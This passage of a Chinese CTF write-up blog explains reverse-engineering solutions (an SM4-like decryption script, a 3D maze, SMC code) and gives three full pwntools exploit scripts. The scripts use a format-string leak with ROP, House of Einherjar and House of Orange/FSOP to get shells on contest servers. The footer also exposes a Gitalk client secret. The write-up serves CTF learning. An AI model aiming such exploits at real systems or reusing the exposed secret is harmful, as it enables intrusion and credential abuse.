+<p>剩下的部分就是根据key生成密钥表，然后对flag进行加密，最后进行比较</p>
+<figure data-type="image" tabindex="37"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/7a51dd52ca87c.png" alt="1638069156783.png" loading="lazy"></figure>
+<p>加密算法如下，推出:v3[i ] = sub_401005(*(a2 + 4 * i + 16) ^ v3[i + 3] ^ v3[i + 2] ^ v3[i + 1]) ^ v3[i+4]</p>
+<figure data-type="image" tabindex="38"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/7f7fcb02d69be.png" alt="1638082038924.png" loading="lazy"></figure>
+<p>剩下的就是把4011E0的加密算法抄下来，然后套上面推出来的公式，就能跑出flag</p>
+<p>脚本如下:</p>
+<pre><code class="language-c++">#include &quot;stdafx.h&quot;
+int key[]={
+        0xcbd6c588, 0x03f17d27, 0x1c18e9cc, 0xfe024db3, 0xd71737eb, 0x7b9b1eab, 0x2776bba4, 0xbd2018c0, 0x356d0553, 0x0c825513, 0xcaaff094, 0x9dfbcba1, 0x7eb6b878, 0x47630f35, 0x4b494bbe, 0x34fd620a,
+        0x14cf85ef, 0xd754e93a, 0x338b4918, 0xc0846091, 0xd526f236, 0xb9ce1fc7, 0xcb537b6a, 0x25fdd8ea, 0x7221094b, 0xa1f73abf, 0x2473d8cc, 0x8fa4f2f2, 0x1e7cac59, 0xec581806, 0x425d33c3, 0xbeb16ed4,
+        0xe5c0ca70, 0x02b60624, 0x3011744f, 0xf73a6e51, 0x4e7f6768, 0x774e5b55, 0x5b78657b, 0x6f6f724c, 0xcccccc00, 0x7968735f, 0xcccccc00, 0x0018ff88, 0x00402579, 0x00000001, 0x008e1228, 0x008e1290};
+char map[352]={
+        0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
+        0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
+        0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
+        0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
+        0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
+        0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
+        0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
+        0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
+        0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
+        0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
+        0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
+        0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
+        0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
+        0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
+        0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
+        0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48};
+unsigned int AROL(unsigned i,unsigned bit){
+    _asm{
+            mov eax,[ebp+8];
+            push ecx;
+            mov ecx,[ebp+0xC];
+            rol eax,cl;
+            pop ecx;
+            leave;
+            retn;
+    }
+    return -1;
+}
+int __cdecl Rcopy(unsigned int a1, char * a2)
+{
+    int result; // eax
+    int i; // [esp+4Ch] [ebp-4h]
+
+    for ( i = 0; i &lt; 4; ++i )
+    {
+        a2[i] = a1 &gt;&gt; (24 - 8 * i);
+        result = i + 1;
+    }
+    return result;
+}
+void __cdecl rev(int a1, char *a2){
+    a2[0]=(a1&amp;0xFF000000)&gt;&gt;24;
+    a2[1]=(a1&amp;0xFF0000)&gt;&gt;16;
+    a2[2]=(a1&amp;0xFF00)&gt;&gt;8;
+    a2[3]=a1&amp;0xFF;
+}
+unsigned int EP(unsigned int a1){
+    int v6=0;
+    Rcopy(a1,(char*)&amp;v6);
+    for(int i=0;i&lt;4;++i){
+        unsigned int p=*((unsigned char*)&amp;v6+i);
+        *((char*)&amp;v6+i)=map[p];
+    }
+    rev(v6,(char*)&amp;a1);
+    return a1^AROL(a1,2)^AROL(a1,10)^AROL(a1,18)^AROL(a1,24);
+
+}
+int main(int argc, char* argv[])
+{
+    int a=0;
+    unsigned int b=0x12345678;
+    b=EP(b);
+    unsigned int aim[36]={0};
+    aim[35]=0xE7A35E0F;
+    aim[34]=0xFC93FC76;
+    aim[33]=0x6CFB29E0;
+    aim[32]=0x162FA567;
+    int i=0;
+    for( i=31;i&gt;=0;i--){
+        aim[i]=EP(key[i + 4] ^ aim[i + 3] ^ aim[i + 2] ^ aim[i + 1])^aim[i+4];
+    }
+    for(i=0;i&lt;4;i++){
+        rev(aim[i],(char*)&amp;aim[i]);
+    }
+    char* t=(char*)aim;
+    for ( i = 0; i &lt; 32; i += 2 )t[i] ^= 6u;
+    for ( i = 1; i &lt; 32; i += 2 )t[i] ^= 7u;
+    getchar();
+    return 0;
+}
+
+</code></pre>
+<h3 id="mazeee">mazeee</h3>
+<p>首先根据提示，可以看到base编码，动态调试发现base表被替换,直接换表base解码</p>
+<figure data-type="image" tabindex="39"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/5ecc296e6fe77.png" alt="1638068430200.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="40"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/acf1f37d5266e.png" alt="1638068459074.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="41"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/4b3ce0cd9e5c1.png" alt="1638068484680.png" loading="lazy"></figure>
+<p>得到,D0g3{Y0u^Can=So1ve_it!</p>
+<p>然后继续分析迷宫,很容易看出来这是一个三维迷宫，并且可以算出步数应该为22</p>
+<figure data-type="image" tabindex="42"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/cc7b19f153759.png" alt="1638068515472.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="43"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/c5e3f85736f91.png" alt="1638068538081.png" loading="lazy"></figure>
+<p>脚本如下：</p>
+<figure data-type="image" tabindex="44"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/ac1bf0da51714.png" alt="1638068570639.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="45"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/10625d27c31f7.png" alt="1638068603043.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="46"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/17ff1b7209e33.png" alt="1638068635296.png" loading="lazy"></figure>
+<p>跑出来是:dWWwwdddWWaawwddsssSaw</p>
+<p>输入后，告诉我这个。。。。，字符串又说我前面有点问题,what?</p>
+<figure data-type="image" tabindex="47"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/64ad30978beaf.png" alt="1638068675789.png" loading="lazy"></figure>
+<p>既然都提醒了是前面，那大概率是下图这段了，不然出题人就疯了</p>
+<figure data-type="image" tabindex="48"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/71226f68a57db.png" alt="1638068706481.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="49"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/51e52d81d72db.png" alt="1638068736634.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="50"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/c3940b838f25f.png" alt="1638068758077.png" loading="lazy"></figure>
+<p>411D80应该是420000数组的初始化函数，然而，420000数组内已经有东西了，并不是我们想的000000000（全局变量是这样的），说明题意大概就是根据420000内的数据，算出42024C的数据，1F和E0这两个数很特殊,看懂了吗，一个取高3位，一个取低5位</p>
+<figure data-type="image" tabindex="51"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/fd3f561fc8a6f.png" alt="1638068794877.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="52"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/4cdf941a24fa2.png" alt="1638068804845.png" loading="lazy"></figure>
+<p>算法就如下吧，不过多阐述了，直接看代码</p>
+<figure data-type="image" tabindex="53"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/796ecbb3d5d05.png" alt="1638068829549.png" loading="lazy"></figure>
+<h3 id="sign-in">sign in</h3>
+<p>有部分smc，直接用ODdump出来</p>
+<figure data-type="image" tabindex="54"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/fec6a7f4e711c.png" alt="1.png" loading="lazy"></figure>
+<p>发现就是算法段</p>
+<figure data-type="image" tabindex="55"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/be95fede83f65.png" alt="2.png" loading="lazy"></figure>
+<p>先是一个xor操作</p>
+<figure data-type="image" tabindex="56"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/7cc7b3fa166dd.png" alt="3.png" loading="lazy"></figure>
+<p>进行置换操作，打乱字符顺序，并保存</p>
+<figure data-type="image" tabindex="57"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/c32bd20ee8105.png" alt="4.png" loading="lazy"></figure>
+<p>先加密，然后结果去比较</p>
+<figure data-type="image" tabindex="58"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/0ae313468611a.png" alt="5.png" loading="lazy"></figure>
+<p>有点像tea算法</p>
+<figure data-type="image" tabindex="59"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/b527dd208cafc.png" alt="6.png" loading="lazy"></figure>
+<p>V5我们不得而知，但是我们可以知道的是42CA44小于256,所以可以爆破</p>
+<figure data-type="image" tabindex="60"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/2954e52436fd9.png" alt="7.png" loading="lazy"></figure>
+<p>脚本如下</p>
+<figure data-type="image" tabindex="61"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/9ae259fbbaa48.png" alt="8.png" loading="lazy"></figure>
+<h2 id="pwn">PWN</h2>
+<h3 id="ez_stack">ez_stack</h3>
+<pre><code class="language-python">from pwn import*
+
+context.log_level = &quot;debug&quot;
+
+#io = process(&quot;./ezstack&quot;)
+io = remote(&quot;47.108.195.119&quot;,&quot;20113&quot;)
+
+def enter():
+	io.recv()
+	io.sendline(&quot;Light1ng&quot;)
+	io.recv()
+	io.sendline(&quot;wwsbb!&quot;)
+
+enter()
+io.sendline(&quot;%11$p%17$pa&quot;)
+io.recvuntil(&quot;0x&quot;)
+canary = int(io.recv(16),16)
+io.recvuntil(&quot;0x&quot;)
+main = int(io.recv(12),16)
+pie = main - 0x9dc
+ret = pie + 0x7c1
+sh_addr = pie + 0xB24
+system_plt = pie + 0x810
+pop_rdi_ret = pie + 0xb03
+success(&quot;canary:&quot;+hex(canary))
+success(&quot;pie:&quot;+hex(pie))
+
+payload =  p64(0)*3 + p64(canary) + p64(0xdeadbeef) + p64(ret) + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_plt)
+
+io.recvline()
+io.sendline(payload)
+io.interactive()
+
+</code></pre>
+<figure data-type="image" tabindex="62"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/e3df1dfd5fcc6.png" alt="1638068094102.png" loading="lazy"></figure>
+<p>如图 main_offset 为0xb + 6</p>
+<p>canary_offset 为 0x5 + 6</p>
+<p>第一发payload 通过泄露main地址得到程序基地址 和 canary</p>
+<p>第二发payload 直接ret2libc shell</p>
+<h3 id="noleak">noleak</h3>
+<p>libc2.7 漏洞点为edit时的off by null</p>
+<p>因为无size限制 直接先申请大chunk 然后释放进unsorted bin</p>
+<p>然后在申请该unsortedbin的一部分 直接show得到libc</p>
+<p>然后就是House Of Einherjar 需要注意填满tcache即可。</p>
+<pre><code class="language-python">from pwn import*
+
+context.log_level = &quot;debug&quot;
+
+io = remote(&quot;47.108.195.119&quot;,&quot;20182&quot;)
+#io = process(&quot;./pwn&quot;)
+
+def menu(choice):
+	io.sendlineafter(&quot;4) delete a chunk&quot;,str(choice))
+
+def add(index,size):
+	menu(1)
+	io.sendlineafter(&quot;Index?&quot;,str(index))
+	io.sendlineafter(&quot;Size?&quot;,str(size))
+
+def delete(index):
+	menu(4)
+	io.sendlineafter(&quot;Index?&quot;,str(index))
+
+def show(index):
+	menu(2)
+	io.sendlineafter(&quot;Index?&quot;,str(index))
+
+def edit(index,content):
+	menu(3)
+	io.sendlineafter(&quot;Index?&quot;,str(index))
+	io.sendlineafter(&quot;content:&quot;,content)
+
+def look():
+	global io
+	gdb.attach(io)
+
+def enter():
+	io.recv()
+	io.sendline(&quot;Light1ng&quot;)
+	io.recv()
+	io.sendline(&quot;wwsbb!&quot;)
+
+def secret():
+	enter()
+	io.sendlineafter(&quot;please input a str:&quot;,&quot;N0_py_1n_tHe_ct7&quot;)
+
+def look():
+	global io
+	gdb.attach(io)
+
+#leak_libc
+secret()
+add(0,0x420)
+add(1,0x18)
+delete(0)
+add(0,0x18)
+show(0)
+io.recvuntil(&quot;\n&quot;)
+info = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
+libc = ELF(&quot;./libc.so.6&quot;,checksec = 0)
+malloc_hook = info - 1104 - 0x10
+libc_base = malloc_hook - libc.sym[&quot;__malloc_hook&quot;] 
+free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]
+system = libc_base + libc.sym[&quot;system&quot;]
+add(0,0x400)
+
+#
+add(0,0xf8)
+add(1,0x18)
+add(2,0xf8)
+for i in range(3,10):
+	add(i,0xf8)
+for i in range(3,10):
+	delete(i)
+
+#
+delete(0)
+edit(1,p64(0)*2+p64(0x100+0x20))
+delete(2)
+
+add(3,0xd0)
+add(4,0x18)
+add(5,0x18)
+add(6,0x18)
+delete(6)
+delete(1)
+edit(5,p64(free_hook))
+
+add(7,0x18)
+add(8,0x18)
+edit(7,&quot;/bin/sh\x00&quot;)
+edit(8,p64(system))
+delete(7)
+io.interactive()
+</code></pre>
+<h3 id="ez_heap">ez_heap</h3>
+<p>跟<strong>HITCON——houseoforange</strong>几乎一模一样</p>
+<p>都是不限制size 然后漏洞为堆块溢出 只有add edit show</p>
+<p>参考博客 ：</p>
+<p>https://blog.csdn.net/A951860555/article/details/116425824?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link</p>
+<p>house of orange 泄露出libc 然后unsorted bin attack + FSOP attack</p>
+<pre><code class="language-python">from pwn import*
+
+context.log_level = &quot;debug&quot;
+
+io = process(&quot;./pwn&quot;)
+
+#io = remote(&quot;47.108.195.119&quot;,&quot;20141&quot;)
+
+def menu(choice):
+	io.sendlineafter(&quot;Your choice : &quot;,str(choice))
+
+def add(size,content):
+	menu(1)
+	io.sendlineafter(&quot;it\n&quot;,str(size))
+	io.sendlineafter(&quot;?\n&quot;,content)
+
+def edit(size,content):
+	menu(2)
+	io.sendlineafter(&quot;it\n&quot;,str(size))
+	io.sendafter(&quot;name\n&quot;,content)
+
+def show():
+	menu(3)
+
+def look():
+	global io
+	gdb.attach(io)
+
+def enter():
+	io.recv()
+	io.sendline(&quot;Light1ng&quot;)
+	io.recv()
+	io.sendline(&quot;wwsbb!&quot;)
+
+#gdb.attach(p)
+#enter()
+add(0x10, &quot;a&quot;)
+edit(0x20,p64(0)*3+p64(0xfc1))
+
+add(0x1000,&quot;top_chunk to the unsorted_bin&quot;)
+
+#fuck the libc and heap through the largebin
+add(0x400,b&quot;a&quot;*8) 
+show()
+libc = ELF(&quot;./libc.so.6&quot;,checksec = 0)
+libc_info = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
+main_arena = libc_info- 1514
+malloc_hook = main_arena - 0x10
+libc_base = malloc_hook - libc.sym[&quot;__malloc_hook&quot;]
+io_list_all = libc_base+libc.sym[&quot;_IO_list_all&quot;]
+system = libc_base+libc.sym[&quot;system&quot;]
+
+edit(0x10,b&quot;a&quot;*0x10)
+show()
+io.recvuntil(b&quot;a&quot;*0x10)
+heap_info = u64(io.recvuntil(&quot;\n&quot;,drop = True).ljust(8,b&quot;\x00&quot;))
+heap_base = heap_info &amp; 0xfffffffffffff000
+
+# unsorted_bin attack + FSOP
+pad = cyclic(0x400)
+
+fsop = b&quot;/bin/sh\x00&quot;+p64(0x61)+p64(0)+p64(io_list_all-0x10)
+fsop += p64(0)+p64(1)
+fsop = fsop.ljust(0xd8, b&quot;\x00&quot;)
+vtable_addr = heap_base+0x530
+fsop += p64(vtable_addr)
+fsop += p64(0)*3+p64(system)
+pad += fsop
+print(hex(system))
+print(hex(io_list_all))
+
+edit(len(pad),pad)
+print(hex(heap_base))
+
+menu(1)
+io.sendlineafter(&quot;it\n&quot;,str(0x18))
+
+io.interactive()
+
+
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#misc">Misc</a>
+<ul>
+<li><a href="#%E5%BA%94%E8%AF%A5%E7%AE%97%E6%98%AF%E7%AD%BE%E5%88%B0">应该算是签到</a></li>
+<li><a href="#cyzcc_loves_lol">CyzCC_loves_LOL</a></li>
+<li><a href="#cthulhu-mythos">Cthulhu Mythos</a></li>
+<li><a href="#lovemath">lovemath</a></li>
+</ul>
+</li>
+<li><a href="#cry">Cry</a>
+<ul>
+<li><a href="#little_trick">little_trick</a></li>
+<li><a href="#ez_equation">ez_equation</a></li>
+<li><a href="#strange">strange</a></li>
+</ul>
+</li>
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#ez_tp">ez_tp</a></li>
+<li><a href="#ezcms">ezcms</a></li>
+</ul>
+</li>
+<li><a href="#re">RE</a>
+<ul>
+<li><a href="#virtus">virtus</a></li>
+<li><a href="#mazeee">mazeee</a></li>
+<li><a href="#sign-in">sign in</a></li>
+</ul>
+</li>
+<li><a href="#pwn">PWN</a>
+<ul>
+<li><a href="#ez_stack">ez_stack</a></li>
+<li><a href="#noleak">noleak</a></li>
+<li><a href="#ez_heap">ez_heap</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/[红明谷CTF 2021]write_shell/">
+              <h3 class="post-title">
+                2021&#34;红明谷CTF&#34;write_shell
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
